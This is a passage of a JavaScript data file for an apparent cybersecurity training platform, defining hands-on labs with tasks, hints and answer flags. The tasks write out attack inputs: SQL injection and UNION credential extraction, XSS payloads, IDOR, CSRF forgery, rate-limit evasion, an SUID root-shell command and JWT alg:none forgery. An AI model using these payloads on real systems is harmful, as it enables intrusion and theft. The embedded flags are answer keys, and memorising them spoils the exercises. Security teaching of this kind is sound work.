      "label": "Ready for the complete hands-on engagement?",
      "buttonText": "Launch Capstone Pentest in Practical Labs",
      "url": "labs.html?lab=capstone"
    },
    "completion": {
      "learned": [
        "Synthesizing all 40 rooms into a unified professional methodology",
        "Executing multi-phase penetration testing from recon to root",
        "Extracting evidence flags and validating business risk",
        "Writing actionable remediation guidance for engineering teams"
      ],
      "practiced": [
        "nmap -sV -p 22,80 10.10.10.100",
        "End-to-end penetration testing workflow",
        "Professional reporting and remediation"
      ]
    },
    "nextRoomId": "room-01"
  }
];

const ENDLESSUS_PRACTICAL_LABS = [
  {
    "id": "lab-sqli",
    "title": "Practical SQL Injection Lab",
    "tagline": "Authentication Bypass & UNION Extraction",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-25",
    "description": "Target a vulnerable e-commerce and administrative portal. Exploit SQL injection in the login field using boolean logic, then perform a multi-column UNION injection to dump user password hashes.",
    "flag": "flag{sqli_admin_bypass_union_success_99}",
    "tasks": [
      {
        "id": "t1",
        "title": "Bypass Login Authentication",
        "instruction": "Inject `' OR '1'='1--` into the administrator username field to achieve authentication without a password."
      },
      {
        "id": "t2",
        "title": "Determine Column Count",
        "instruction": "Use `ORDER BY` or `UNION SELECT NULL, NULL...` to identify that the query returns 3 columns."
      },
      {
        "id": "t3",
        "title": "Extract User Credentials",
        "instruction": "Extract table records using `' UNION SELECT 1, username || ':' || password, 3 FROM users--`."
      }
    ],
    "hints": [
      "Concept: SQL injection alters backend query logic.",
      "Direction: Test single quotes in input fields.",
      "Tool: Web browser form or curl.",
      "Syntax: `' OR '1'='1--`",
      "Explanation: The `--` characters comment out trailing password checks."
    ]
  },
  {
    "id": "lab-xss",
    "title": "Practical Cross-Site Scripting (XSS) Lab",
    "tagline": "Stored & Reflected Execution Sandbox",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-26",
    "description": "Exploit reflected parameters in search bars and stored XSS inside a live comment feed. Craft JavaScript payloads to steal simulated session cookies and bypass basic client-side filters.",
    "flag": "flag{xss_stored_cookie_exfiltration_77}",
    "tasks": [
      {
        "id": "t1",
        "title": "Trigger Reflected Alert",
        "instruction": "Submit `<script>alert('XSS')</script>` into the query parameter to verify lack of HTML entity encoding."
      },
      {
        "id": "t2",
        "title": "Deploy Stored Payload",
        "instruction": "Post a comment containing an image tag with an onerror handler: `<img src=x onerror=alert(document.domain)>`."
      },
      {
        "id": "t3",
        "title": "Simulate Cookie Exfiltration",
        "instruction": "Execute payload to read simulated `document.cookie` and capture the session flag."
      }
    ],
    "hints": [
      "Concept: Injected JavaScript executes within the victim's browser DOM.",
      "Direction: If `<script>` is blocked, test event handlers like `<img src=x onerror=...>`.",
      "Tool: Browser DevTools or curl.",
      "Syntax: `<img src=x onerror=alert(1)>`",
      "Explanation: Broken image source triggers the onerror JavaScript handler immediately."
    ]
  },
  {
    "id": "lab-idor",
    "title": "Practical Insecure Direct Object References (IDOR) Lab",
    "tagline": "Parameter Tampering & Account Takeover",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "25 min",
    "foundationalRoomId": "room-27",
    "description": "Analyze a customer profile dashboard. Intercept outgoing API requests, manipulate user object IDs, and extract private account tokens belonging to administrative accounts.",
    "flag": "flag{idor_horizontal_account_takeover_42}",
    "tasks": [
      {
        "id": "t1",
        "title": "Map Profile API Endpoint",
        "instruction": "Identify the user identifier in the URL: `/api/users/profile?id=102`."
      },
      {
        "id": "t2",
        "title": "Test Horizontal IDOR",
        "instruction": "Change ID parameter from `102` to `101` and verify that another student's profile is returned."
      },
      {
        "id": "t3",
        "title": "Access Administrative Object",
        "instruction": "Request `id=100` (root admin) to extract the secret API flag."
      }
    ],
    "hints": [
      "Concept: The server trusts user-supplied database IDs without checking authorization.",
      "Direction: Inspect HTTP requests in DevTools Network tab.",
      "Tool: curl or browser URL bar.",
      "Syntax: Modify `?id=102` to `?id=100`.",
      "Explanation: The server validates authentication but omits authorization checks."
    ]
  },
  {
    "id": "lab-csrf",
    "title": "Practical Cross-Site Request Forgery (CSRF) Lab",
    "tagline": "Forged Transactions & SameSite Bypass",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "25 min",
    "foundationalRoomId": "room-28",
    "description": "Construct a third-party HTML proof-of-concept page that exploits ambient cookie authority to force an authenticated banking user to transfer simulated funds.",
    "flag": "flag{csrf_ambient_cookie_forgery_81}",
    "tasks": [
      {
        "id": "t1",
        "title": "Analyze State-Changing Form",
        "instruction": "Inspect the fund transfer form to verify whether any anti-CSRF token exists in the parameters."
      },
      {
        "id": "t2",
        "title": "Craft Malicious HTML PoC",
        "instruction": "Create an auto-submitting form targeting `/api/transfer` with attacker recipient."
      },
      {
        "id": "t3",
        "title": "Execute Cross-Origin Forgery",
        "instruction": "Submit the request with simulated active session to trigger the unauthorized transaction."
      }
    ],
    "hints": [
      "Concept: The victim's browser automatically includes cookies on cross-origin requests.",
      "Direction: Look for missing CSRF tokens in state-changing POST endpoints.",
      "Tool: HTML form generator.",
      "Syntax: `<form action='...' method='POST'>`",
      "Explanation: Without tokens or SameSite=Strict, the server processes the request."
    ]
  },
  {
    "id": "lab-auth",
    "title": "Practical Authentication & Brute Force Lab",
    "tagline": "Rate Limit Evasion & Credential Stuffing",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-29",
    "description": "Audit an authentication gateway. Test password dictionary spraying against user accounts, evade basic rate-limiting filters using header rotation, and crack the target account.",
    "flag": "flag{auth_dictionary_lockout_bypass_63}",
    "tasks": [
      {
        "id": "t1",
        "title": "Identify Lockout Thresholds",
        "instruction": "Observe after how many failed attempts the server responds with HTTP 429 Too Many Requests."
      },
      {
        "id": "t2",
        "title": "Test Header Spoofing",
        "instruction": "Add `X-Forwarded-For: 10.0.0.X` headers to test if IP rate limiting can be circumvented."
      },
      {
        "id": "t3",
        "title": "Recover Valid Credentials",
        "instruction": "Iterate candidate passwords from the lab wordlist to unlock user `cadet`."
      }
    ],
    "hints": [
      "Concept: Brute force automated dictionary attacks.",
      "Direction: Watch response status codes (401 vs 429 vs 200).",
      "Tool: Bash curl loop or Hydra.",
      "Syntax: `curl -d 'user=...&pass=...' ...`",
      "Explanation: Valid password returns HTTP 200 with an authorization session token."
    ]
  },
  {
    "id": "lab-headers",
    "title": "Practical HTTP Security Headers Lab",
    "tagline": "CSP Evaluation & Header Configuration",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Web Security",
    "estimatedTime": "25 min",
    "foundationalRoomId": "room-30",
    "description": "Audit a live web server's HTTP response headers. Identify missing defense-in-depth headers, craft custom Content-Security-Policy (CSP) rules, and eliminate Clickjacking risks.",
    "flag": "flag{headers_csp_hsts_hardening_complete_14}",
    "tasks": [
      {
        "id": "t1",
        "title": "Inspect Raw Headers",
        "instruction": "Execute `curl -I` against the target to catalog all active response headers."
      },
      {
        "id": "t2",
        "title": "Detect Clickjacking Exposure",
        "instruction": "Verify that `X-Frame-Options` and CSP `frame-ancestors` are missing, allowing iframe embedding."
      },
      {
        "id": "t3",
        "title": "Configure Hardened Policy",
        "instruction": "Apply compliant CSP and HSTS header directives in the lab web configuration."
      }
    ],
    "hints": [
      "Concept: Browser security headers instruct the client to enforce defensive restrictions.",
      "Direction: Look for missing X-Frame-Options and Content-Security-Policy.",
      "Tool: `curl -I`",
      "Syntax: `curl -I http://localhost:8080`",
      "Explanation: Proper headers prevent clickjacking and inline script injection."
    ]
  },
  {
    "id": "lab-suid",
    "title": "Practical Linux SUID Privilege Escalation Lab",
    "tagline": "Binary Analysis & Root Shell Drop",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Linux Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-31",
    "description": "Gain an interactive shell as unprivileged user `cadet`. Enumerate the filesystem for SUID binaries, discover an improperly configured administrative binary, and spawn an elevated root shell.",
    "flag": "flag{suid_gtfobins_root_shell_pwned_55}",
    "tasks": [
      {
        "id": "t1",
        "title": "Locate SUID Binaries",
        "instruction": "Run `find / -perm -4000 -type f 2>/dev/null` to discover non-standard SUID files."
      },
      {
        "id": "t2",
        "title": "Consult GTFOBins",
        "instruction": "Identify that `/usr/bin/find` has SUID permissions and supports the `-exec` shell spawn parameter."
      },
      {
        "id": "t3",
        "title": "Spawn Root Shell",
        "instruction": "Execute `/usr/bin/find . -exec /bin/sh -p \\; -quit` to achieve UID 0 and read `/root/root.txt`."
      }
    ],
    "hints": [
      "Concept: SUID allows binaries to execute with the permissions of the file owner (root).",
      "Direction: Look for `/usr/bin/find` in the find output.",
      "Tool: `find` and `/bin/sh -p`",
      "Syntax: `/usr/bin/find . -exec /bin/sh -p \\; -quit`",
      "Explanation: The `-p` flag preserves root privileges during subshell creation."
    ]
  },
  {
    "id": "lab-smb",
    "title": "Practical SMB & Network Share Enumeration Lab",
    "tagline": "Null Sessions & Sensitive Share Extraction",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Network Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-32",
    "description": "Interact with an exposed Windows / Samba network file server. Exploit anonymous Null Sessions on port 445, navigate hidden network shares, and retrieve cleartext credentials.",
    "flag": "flag{smb_null_session_share_exfiltrated_38}",
    "tasks": [
      {
        "id": "t1",
        "title": "Enumerate Shares Anonymously",
        "instruction": "Execute `smbclient -L //10.10.10.25 -N` to list all exposed network shares."
      },
      {
        "id": "t2",
        "title": "Connect to Unprotected Share",
        "instruction": "Connect to the `backups` share using `smbclient //10.10.10.25/backups -N`."
      },
      {
        "id": "t3",
        "title": "Exfiltrate Credentials File",
        "instruction": "Use the `get` command to download `system_credentials.txt`."
      }
    ],
    "hints": [
      "Concept: SMB null sessions allow unauthenticated share listing.",
      "Direction: Use the `-N` flag with smbclient.",
      "Tool: `smbclient`",
      "Syntax: `smbclient -L //10.10.10.25 -N`",
      "Explanation: Connects with blank username and password."
    ]
  },
  {
    "id": "lab-jwt",
    "title": "Practical JSON Web Token (JWT) Exploitation Lab",
    "tagline": "Alg: None & Weak Secret Key Cracking",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Modern Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-33",
    "description": "Audit an authentication token issued to a standard user. Decode the token, tamper with claims to elevate role to `administrator`, and exploit the `alg: none` vulnerability to bypass signature verification.",
    "flag": "flag{jwt_token_forged_none_algorithm_91}",
    "tasks": [
      {
        "id": "t1",
        "title": "Decode Token Parts",
        "instruction": "Decode the Header and Payload using Base64Url to inspect declared claims."
      },
      {
        "id": "t2",
        "title": "Tamper Payload Claims",
        "instruction": "Change `\"role\": \"cadet\"` to `\"role\": \"administrator\"`."
      },
      {
        "id": "t3",
        "title": "Strip Signature with None Alg",
        "instruction": "Update header to `{\"alg\":\"none\",\"typ\":\"JWT\"}` and submit unsigned token to `/api/admin`."
      }
    ],
    "hints": [
      "Concept: JWT payloads are not encrypted; signatures protect against tampering.",
      "Direction: If the server accepts `none`, you can strip the signature completely.",
      "Tool: Base64 decode/encode or curl.",
      "Syntax: `Header.Payload.` (trailing dot with empty signature).",
      "Explanation: Vulnerable libraries skip signature checks when alg is none."
    ]
  },
  {
    "id": "lab-crypto",
    "title": "Practical Cryptography & Ciphertext Analysis Lab",
    "tagline": "XOR Cracking & Frequency Breakdown",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Modern Security",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-34",
    "description": "Analyze intercepted ciphertext from an obsolete custom encryption routine. Apply letter frequency analysis and brute-force single-byte XOR keys to recover the secret plaintext communication.",
    "flag": "flag{crypto_xor_frequency_cracked_73}",
    "tasks": [
      {
        "id": "t1",
        "title": "Calculate Character Frequencies",
        "instruction": "Analyze byte distribution to verify non-randomness characteristic of simple substitution."
      },
      {
        "id": "t2",
        "title": "Brute-Force Single-Byte Keys",
        "instruction": "Iterate all 256 possible byte keys (0x00 to 0xFF) and score output using English letter frequencies."
      },
      {
        "id": "t3",
        "title": "Recover Plaintext Flag",
        "instruction": "Locate the key producing legible English text and extract the secret key flag."
      }
    ],
    "hints": [
      "Concept: Single-byte XOR has only 256 possible keys.",
      "Direction: Test byte keys from 0 to 255 against the hex stream.",
      "Tool: Python script.",
      "Syntax: `[b ^ key for b in ciphertext]`",
      "Explanation: The correct key reveals recognizable English words."
    ]
  },
  {
    "id": "lab-nmap",
    "title": "Practical Network Recon & Port Scanning Lab",
    "tagline": "Nmap Flags & Service Fingerprinting",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Security Tools",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-20",
    "description": "Perform real-time network enumeration against a multi-service lab target (`10.10.10.25`). Execute SYN stealth scans, fingerprint service banners, detect underlying OS versions, and save reports.",
    "flag": "flag{nmap_service_fingerprint_master_29}",
    "tasks": [
      {
        "id": "t1",
        "title": "Perform Fast TCP Sweep",
        "instruction": "Run `nmap -sS -T4 -p 1-1000 10.10.10.25` to locate all open ports."
      },
      {
        "id": "t2",
        "title": "Fingerprint Software Versions",
        "instruction": "Run `nmap -sV -p 22,80,445 10.10.10.25` to detect exact daemon versions."
      },
      {
        "id": "t3",
        "title": "Run Safe NSE Scripts",
        "instruction": "Execute `nmap -sC -p 80,445 10.10.10.25` to discover web title and Samba configuration."
      }
    ],
    "hints": [
      "Concept: Port scanning detects active listening network services.",
      "Direction: Combine `-sS` for stealth with `-sV` for version detection.",
      "Tool: `nmap`",
      "Syntax: `nmap -sV -p- 10.10.10.25`",
      "Explanation: Scans all ports and extracts banners."
    ]
  },
  {
    "id": "lab-packets",
    "title": "Practical Packet Inspection & Traffic Analysis Lab",
    "tagline": "PCAP Stream Following & Credential Interception",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "category": "Security Tools",
    "estimatedTime": "30 min",
    "foundationalRoomId": "room-21",
    "description": "Load an intercepted `.pcap` capture file recorded during an internal network breach. Apply Wireshark display filters to isolate HTTP POST traffic, follow TCP streams, and reconstruct plaintext passwords.",
    "flag": "flag{pcap_stream_followed_credentials_extracted_64}",
    "tasks": [
      {
        "id": "t1",
        "title": "Filter for Web Traffic",
        "instruction": "Apply the display filter `http` to isolate Hypertext Transfer Protocol packets."
      },
      {
        "id": "t2",
        "title": "Filter Login Submissions",
        "instruction": "Apply `http.request.method == \"POST\"` to isolate form submissions."
      },
      {
        "id": "t3",
        "title": "Follow TCP Conversation",
        "instruction": "Follow the TCP stream of the authentication handshake to read the cleartext password payload."
      }
    ],
    "hints": [
      "Concept: Unencrypted HTTP packets expose all application data in plain text.",
      "Direction: Use Wireshark display filters or tcpdump.",
      "Tool: `wireshark` or `tcpdump`",
      "Syntax: `http.request.method == \"POST\"`",
      "Explanation: Following the TCP stream reassembles all packet fragments into readable text."
    ]
  },
  {
    "id": "lab-capstone",
    "title": "Capstone Pentest: Final Enterprise Target",
    "tagline": "End-to-End Penetration Test Engagement",
    "difficulty": "Advanced",
    "difficultyBadge": "🔴 Advanced",
    "category": "Junior Pentester",
    "estimatedTime": "60 min",
    "foundationalRoomId": "room-40",
    "description": "A complete multi-stage penetration testing engagement against an isolated enterprise target (`10.10.10.100`). Execute reconnaissance, web fuzzing, SQL injection exploitation, initial shell access, local enumeration, SUID privilege escalation, and executive reporting.",
    "flag": "flag{endlessus_capstone_certified_junior_pentester_2026}",
    "tasks": [
      {
        "id": "t1",
        "title": "Phase 1: Recon & Nmap Scan",
        "instruction": "Scan 10.10.10.100 to discover open ports (22, 80)."
      },
      {
        "id": "t2",
        "title": "Phase 2: Directory Fuzzing",
        "instruction": "Fuzz endpoints to discover hidden administrative login at `/api/v2/auth`."
      },
      {
        "id": "t3",
        "title": "Phase 3: SQLi Exploitation",
        "instruction": "Exploit SQL injection in login to extract API access token."
      },
      {
        "id": "t4",
        "title": "Phase 4: SSH Initial Foothold",
        "instruction": "Connect to target shell as user `cadet` and retrieve `user.txt`."
      },
      {
        "id": "t5",
        "title": "Phase 5: SUID Privilege Escalation",
        "instruction": "Locate SUID `/usr/bin/find` and escalate privileges to root."
      },
      {
        "id": "t6",
        "title": "Phase 6: Executive Reporting",
        "instruction": "Capture `root.txt` and review the generated security remediation summary."
      }
    ],
    "hints": [
      "Concept: Full methodology synthesis across all 10 stages.",
      "Direction: Follow PTES: Recon -> Enum -> Exploit -> Privesc -> Report.",
      "Tool: Nmap, curl, ffuf, SUID find.",
      "Syntax: Step-by-step multi-stage execution.",
      "Explanation: Successful completion awards the Endlessus Junior Pentester Certificate badge."
    ]
  }
];

// Helper Lookup Index
const ENDLESSUS_ROOM_MAP = {};
ENDLESSUS_ROOMS.forEach(r => { ENDLESSUS_ROOM_MAP[r.id] = r; });

const ENDLESSUS_LAB_MAP = {};
ENDLESSUS_PRACTICAL_LABS.forEach(l => { ENDLESSUS_LAB_MAP[l.id] = l; });

console.log('[Endlessus Database] Loaded ' + ENDLESSUS_ROOMS.length + ' rooms across ' + ENDLESSUS_STAGES.length + ' stages + ' + ENDLESSUS_PRACTICAL_LABS.length + ' practical labs.');

if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    ENDLESSUS_STAGES,
    ENDLESSUS_ROOMS,
    ENDLESSUS_PRACTICAL_LABS,
    ENDLESSUS_ROOM_MAP,
    ENDLESSUS_LAB_MAP
  };
}
